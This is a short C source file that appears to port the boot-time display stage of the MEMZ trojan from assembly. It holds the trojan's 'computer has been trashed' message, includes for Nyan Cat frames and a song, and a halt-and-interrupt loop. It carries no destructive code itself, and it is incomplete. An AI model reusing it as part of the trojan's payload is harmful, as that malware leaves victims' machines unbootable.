#include <x86.h>

#include "animation.h" // animation.c
#include "timer.h"
#include "interrupts.h"
// include "Utils/macros.asm" ->
#include "macros.h"

#include "data/frames.h"
#include "data/special.h"
#include "data/song.h"
const char* message = "Your computer has been trashed by the MEMZ trojan. Now enjoy the Nyan Cat...";
const int messageLength = strlen(message) - 1;

void Stage2_main_internal(){
	// include "Setup/setup.asm" -> _setup();

	while (true) {
		CPU_HaltProgram();
		CPU_RunAndProcessInterrupts();
	}

	// include "Utils/timer.asm" --> timer.c
	// include "Interrupts/timerHandler.asm"
	// include "Interrupts/keyboardHandler.asm" -- > interrupts.c/h
}